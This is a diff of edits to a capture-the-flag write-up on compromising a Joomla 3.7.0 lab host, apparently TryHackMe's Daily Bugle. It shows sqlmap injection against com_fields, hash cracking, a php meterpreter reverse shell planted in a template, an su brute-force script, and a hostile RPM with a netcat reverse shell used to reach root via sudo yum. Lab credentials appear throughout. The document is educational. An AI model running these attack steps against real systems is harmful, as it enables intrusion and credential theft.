@@ -18,7 +18,7 @@ The attack takes place on a flat network consisting of the attack host, a freshl
 Prior to starting initial recon, I opened up a metasploit console and connected it to the msfdb postgres backend to gather any information that I had found into a single point. I also had set up burp suite to run on port 8080 and configured the local CA in Firefox. Finally I installed gobuster and seclists in anticipation of any enumeration I might need to do. I'm looking forward to these being included with Kali though I really only uses them for personal preference reasons.
 
 ### Host enumeration
-After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify at a high level what I was looking at.
+After this initial setup, I started with a SYN, OS and Version scan of the host to attempt to identify what this target host was.
 
 ```
 msf5 > db_nmap -sS -sV -O 10.10.162.223
@@ -40,16 +40,16 @@ msf5 > db_nmap -sS -sV -O 10.10.162.223
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 16.23 seconds
 ```
 
-This scan told me that the target looked to be a linux host, specifically running a 3.10-3.13 kernel. It also told me that, atleast initially, it would look like I was facing a LAMP stack. I figured at this point it would be a good chance to do some happy path clicking around the site.
+This scan told me that the target looked to be a linux host, specifically running a 3.10-3.13 kernel. It also told me that, atleast initially, it would look like it was running a LAMP stack. I figured at this point it would be a good chance to do some happy path clicking around the site.
 
 #### Visiting the Daily Bugle
 I opened the site in my browser to what looked like a news-focused blog.
 
 ![daily index](/img/daily_bugle_http_index.png)
 
-There wasn't any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site didn't yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn't want to attempt any bruteforce.
+There wasn't any immediately links available to any sort of admin page, outside of a simple login panel on the homepage. Happy path clicking around the site also didn't yield any other information about potential users or even which CMS the site was using as far as I could identify. Without a hint of a username I didn't want to attempt any bruteforce.
 
-At this point, I decided to enumerate directories on the site to see if I could find a directory that would yield more information.
+Thus, I decided to enumerate directories on the site to see if I could find anything that would yield more information about what kinda site this was.
 
 ### Enumerating directories on the site
 In order to run the directory enumeration, I reached for my favorite enumeration tool and directory wordlist.
@@ -93,7 +93,7 @@ This returned a huge number of useful directories including an `/administrator` 
 
 ![daily administrator page](/img/daily_bugle_http_administrator.png)
 
-However, this alone atleast told me that I was investigating a Joomla blog. I decided to try to identify the version of Joomla which, to my luck, could be accomplished with the `auxiliary/scanner/http/joomla_version` module in metasploit which was able to tell me that it looked like this host was running version `3.7.0`
+However, this atleast told me that I was investigating a Joomla site. Using the `auxiliary/scanner/http/joomla_version` module in metasploit I was able to also determine that this host was running version Joomla `3.7.0`.
 
 ```
 msf5 auxiliary(scanner/http/joomla_version) > run
@@ -108,13 +108,13 @@ With a version and CMS in mind I decided to feed the pair into searchsploit to s
 
 ```
 root@kali:~# searchsploit -w joomla | grep 3.7.0
-Joomla! 3.7.0 - 'com_fields' SQL Injection                                                                               | https://www.exploit-db.com/exploits/42033
+Joomla! 3.7.0 - 'com_fields' SQL Injection    | https://www.exploit-db.com/exploits/42033
 ```
 
-This yielded a single sql injection vulnerability that abused a parameter in the com_fields component. Specifically this blog called out that this component was vulnerable to both an error-based, time-based and boolean-based blind injection. Further information on the specific vulnerability could be found on the [sucuri blog.](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).
+This yielded a single sql injection vulnerability that abused a parameter in the com_fields component. Specifically, this exploit called out that this component was vulnerable to an error-based injection as well as a time-based and boolean-based blind injection. Further information on the specific vulnerability can be found on the [sucuri blog](https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html).
 
 ### Mapping the database
-I decided to try to map out the database to see if I could leak the credentials to the admin panel through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques for each identified in the vulnerability and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. However it's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.
+I decided to try to map out the database to see if I could leak the admin credentials through one of these injection methods. To start, I ran a `sqlmap` command with the `TEB` techniques, representing each of the identified techniques in the vulnerability listing, and the `--dbs` flag to attempt to identify the joomla database. I've truncated some of the output to save space. However it's worth noting that this run took quite a while as it was left intentionally broad to identify more information about the database.
 
 ```
 msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'list[fullordering]' --risk=3 --level=5 --random-agent --proxy http://127.0.0.1:8080 --technique=TEB --dbs
@@ -178,9 +178,9 @@ available databases [5]:
 [*] ending @ 21:23:34 /2020-11-27/
 ```
 
-Eventually this both identified a few valid injection techniques which I could use to further refine the sqlmap command. It additionally identified that the joomla database was in fact called `joomla`.
+This eventually identified valid injection techniques which could be used to further refine the `sqlmap` command. It additionally identified that the joomla database was in fact called `joomla`.
 
-With this in mind, I tried to better map the tables in the joomla database. Again, the output was truncated for space. While this identified many tables. I've included only a few of the most interesting.
+With this in mind, I was able to refine my `sqlmap` command to attempt to map the tables in the `joomla` database. Again, the output was truncated for space. While this identified many tables, I've included only a few of the most interesting.
 
 ```
 msf5 auxiliary(scanner/http/joomla_version) > sqlmap -u "http://10.10.162.223/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" -p 'l
@@ -233,7 +233,7 @@ back-end DBMS: MySQL >= 5.0.0 (MariaDB fork)
 [*] ending @ 21:26:37 /2020-11-27/
 ```
 
-With a `#__users` table in mind, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to try to identify a set of columns for the table to query against. Luckily, the schema for the `users` table for joomla `3.7.0` was easy to come by and I created a wordlist using the column names.
+With a `#__users` table now identified, I decided to attempt to enumerate this table for a valid set of user credentials. But before doing that I needed to try to identify a set of columns for the table to query against. Luckily, the schema for the `users` table for joomla `3.7.0` was readily available so I created a wordlist using the column names.
 
 ```
 root@kali:~/ctf# cat table_schema.txt 
@@ -335,7 +335,7 @@ Table: #__users
 [*] ending @ 21:36:24 /2020-11-27/
 ```
 
-This returned what looked like a valid set of credentials including a hash. With this I decided to run the credentials through `john` using the rockyou wordlist to see if I could crack identify the user's password.
+This returned what looked like a valid set of hashed credentials. I decided to run the credentials through `john` using the rockyou wordlist to see if I could identify the user's password.
 
 ### Cracking the hash
 I ran `john` with a parallelism of 2 due to my attack host's 2 vcpus and walked away to let this run. Eventually I was lucky to obtain a match.
@@ -359,7 +359,7 @@ Session completeds
 
 With these new-found credentials (`jonah:spiderman123`), I was able to get through to the admin panel. I imediately began clicking around to see if I could find a template or module that I could attempt to inject a shell into.
 
-Additionally, prior to starting an attack, I decided to start a wordlist of the credentials I was finding. On my first attempt I neglected to do this which I later found to have caused me a ton of problems.
+Additionally, prior to starting an attack, I decided to start a wordlist of the credentials I was finding. On my first attempt I neglected to maintain a wordlist, this seemed like a small omission at the time but I later found it to have caused me a ton of problems.
 
 #### Starting a Wordlist
 ```
@@ -368,7 +368,7 @@ root@kali:~/ctf# echo 'spiderman123' > wordlists/dailybugle.txt
 ```
 
 ### Catching a shell
-It wasn't long before I found a path to the template page that I could inject a php shell into and I generated a payload using meterpreter.
+It wasn't long before I found a path to the template page that I could inject a php shell into and I generated a php payload using meterpreter.
 
 ```
 root@kali:~/ctf# msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.182.144 LPORT=4444
@@ -381,7 +381,7 @@ Payload size: 1114 bytes
 
 ![daily bugle shell injection](/img/daily_bugle_http_shell_in_template.png)
 
-I then opened the index.php template, saved the original contents and copied the shell into the body of the template. Prior to saving and executing I needed to stage up my listener to catch the shell.
+I then opened the index.php template, saved the original contents to a backup file and copied the shell into the now empty body of the template. Prior to saving and executing I stageg up my listener to catch the incoming shell.
 
 
 ```
@@ -419,7 +419,7 @@ msf5 exploit(multi/handler) > run -j
 [*] Started reverse TCP handler on 10.10.182.144:4444
 ```
 
-Additionally after starting a handler, I staged up the `shell_to_meterpreter` post exploit module so that I could quickly migrate the process from an active php session to a longer lived session in case there was a timeout configured on the webserver.
+Additionally after starting a handler, I staged up the `shell_to_meterpreter` post-exploit module so that I could quickly migrate the process from a php worker to a longer lived process in case there was a timeout configured on the webserver.
 
 ```
 msf5 exploit(multi/handler) > search shell_to_meterpreter
@@ -448,7 +448,7 @@ msf5 post(multi/manage/shell_to_meterpreter) > set SESSION 1
 SESSION => 1
 ```
 
-I then saved the template and refreshed the index page which quickly resulted in a caught shell. Next I executed the post-exploit `shell_to_meterpreter` module to obtain a stabler shell.
+I then saved the template and refreshed the index page which quickly resulted in a caught shell. Next I executed the post-exploit `shell_to_meterpreter` module.
 
 ```
 msf5 post(multi/manage/shell_to_meterpreter) > 
@@ -491,12 +491,12 @@ msf5 post(multi/manage/shell_to_meterpreter) > sessions -k 1
 [*] 10.10.162.223 - Meterpreter session 1 closed.
 ```
 
-Once I had a stabler shell established, I killed the original shell and quickly replaced the exploited template with it's original contents before verifying that I was now able to see the original index page.
+Once I had a stable shell established, I killed the original shell and quickly replaced the exploited template with it's original contents before verifying that I was now able to see the original, unmodified index page.
 
 ![daily bugle restored index](/img/daily_bugle_http_replaced_landing_page.png)
 
 ### Local enumeration
-Now that I had a local shell, I decided to 
+With my new local shell, I reached for linPEAS to run a quick local enumeration of the host. 
 
 ```
 msf5 post(multi/manage/shell_to_meterpreter) > sessions 2
@@ -527,7 +527,7 @@ meterpreter > download 10.10.162.223_enum.txt /root/ctf/
 [*] download   : 10.10.162.223_enum.txt -> /root/ctf//10.10.162.223_enum.txt
 ```
 
-Interestingly the enumeration gave me to pieces of information that were worthwhile, a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file. 
+The enumeration gave yielded a few pieces of information that seemed worthwhile, a username `jjameson` and a set of root credentials for mysql DB from the `/var/www/html/configuration.php` file. 
 
 
 ```
@@ -541,14 +541,16 @@ root:x:0:0:root:/root:/bin/bash
      public $password = 'nv5uz9r3ZEDzVjNu';
 ```
 
-I then added this set of credentials to my dailybugle wordlist. In my initial pass I had neglected to do this which lead to a significant rabbithole as I continuously enumerated the host looking for a point of escalation.
+I added this set of credentials to my dailybugle wordlist and decided to investigate how I could move horizontally to the `jjameson` user. 
+
+It's worth noting, in my initial pass I had neglected to document the above password which lead to a significant rabbithole as I continuously enumerated the host looking for a point of escalation.
 
 ```
 root@kali:~/ctf# echo 'nv5uz9r3ZEDzVjNu' >> ./wordlists/dailybugle.txt
 ```
 
 ### Horizontal local privilege escalation
-Now that I had identified the jjameson user as a potential next target I decided to attempt to escalate locally using the a small bash cript from Carlos Polop that bruteforces `su`. I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transfered this over to the host over a local http webserver.
+Now that I had identified the `jjameson` user as a potential next target I decided to attempt to escalate locally using a small, but immensely useful, bash script from Carlos Polop that bruteforces `su`. I generated a new wordlist by combining the dailybugle wordlist and rockyou and then transferred this over to the host over a local http webserver. While not shown, `suBF.sh` was transfered to the host over the meterpreter session.
 
 ```
 root@kali:~/ctf# curl -sO https://raw.githubusercontent.com/carlospolop/su-bruteforce/master/suBF.sh
@@ -594,10 +596,10 @@ Last login: Fri Nov 27 17:37:52 2020
 user.txt
 ```
 
-Additionally I immediately found the first flag at `/home/jjameson/user.txt`.
+Upon logging in, I immediately found the first flag at `/home/jjameson/user.txt`.
 
 ### Local enumeration again...
-Now that I had a new low-privilege user I decided to run through enumeration with `linPEAS` again to see if it turned up anything more useful than the previous scan. I uploaded the script to the users home directory and re-executed it.
+Now that I had a new low-privilege user I decided to run through enumeration with `linPEAS` again to see if it would turn up anything more useful than the previous scan. I uploaded the script to the users home directory and re-executed it.
 
 ```
 User jjameson may run the following commands on dailybugle:
@@ -607,10 +609,10 @@ User jjameson may run the following commands on dailybugle:
 Interestingly this showed that the user had sudo privileges to execute `yum` which appeared to give the user the ability to install or uninstall anything on the host.
 
 ### Exploiting yum for vertical escalation
-With the ability to execute yum on the host as a privileged user I decided to try crafting a hostile RPM that I could use to trigger a reverse shell. To do this I would first need to craft the hostile package.
+With the ability to execute yum on the host as a privileged user, I tried to craft a hostile RPM that I could use to trigger a reverse shell. To do this I would first need to craft the hostile package.
 
 #### Crafting a hostile RPM
-Referencing [gtfobins](https://gtfobins.github.io/gtfobins/yum/) I decided to craft the RPM using [fpm](https://github.com/jordansissel/fpm). My plan of attack was to pack a netcat reverse shell into the `before-install` trigger of an empty package.
+Referencing [gtfobins](https://gtfobins.github.io/gtfobins/yum/) I crafted the RPM using [fpm](https://github.com/jordansissel/fpm). My plan of attack was to pack a netcat reverse shell into the `before-install` trigger of an empty package.
 
 ```
 root@kali:~/ctf# EXPLOITDIR=$(mktemp -d)
@@ -623,7 +625,7 @@ Require just the needed backports instead, or 'backports/latest'.
 Created package {:path=>"exploited-1.0-1.noarch.rpm"}
 ```
 
-With the attack staged I, again, setup a listener in metasploit and then staged up the shell_to_meterpreter to migrate to a stabler shell incase yum timed out.
+With the attack staged I, again, setup a listener in metasploit and then staged up the `shell_to_meterpreter` module to migrate to a stable shell in case yum timed out.
 
 ```
 msf5 post(multi/manage/shell_to_meterpreter) > use exploit/multi/handler 
@@ -643,7 +645,7 @@ Payload options (generic/shell_reverse_tcp):
    Name   Current Setting  Required  Description
    ----   ---------------  --------  -----------
    LHOST  10.10.182.144    yes       The listen address (an interface may be specified)
-   LPORT  44444             yes       The listen port
+   LPORT  4444             yes       The listen port
 
 
 Exploit target:
@@ -688,7 +690,7 @@ exploited-1.0-1.noarch.rpm
 Loaded plugins: fastestmirror
 ```
 
-Eventually this 
+It took quite a while to get through the yum plugins, yet eventially the session opened. 
 
 ```
 msf5 post(multi/manage/shell_to_meterpreter) > [*] Command shell session 3 opened (10.10.182.144:4444 -> 10.10.162.223:36016) at 2020-11-27 23:06:30 +0000
@@ -728,7 +730,7 @@ whoami
 root
 ```
 
-Success! With the session upgraded, I confirmed that I had a root account. Finally I found the root flag under `/root/root.txt`
+Success! With the session upgraded, I confirmed that I had a root account and quickly found the root flag under `/root/root.txt`
 
 ## Summary
-This challenge really impressed the importance of dilligently taking notes onto me. On my first pass I found but failed to note the root mysql user's password. This lead to me rabbitholing for hours trying to find a local exploit method to move from the apache user to jjameson. It took me walking away and taking stock of everything I knew before I thought to run the known credentials against `jjameson`. The largest lesson I learned is to note everything, especially credentials, as user's might reuse the same credentials many times.
+This challenge really impressed onto me the importance of diligently taking notes. On my first pass I found, but failed to note, the root mysql user's password. This lead to me rabbitholing for hours trying to find a local exploit method to move from the apache user to `jjameson`. It took me walking away and taking stock of everything I knew before I thought to compile and run the known credentials against `jjameson`. The largest lesson I learned is to note everything, especially credentials, as user's might reuse the same credentials many times.
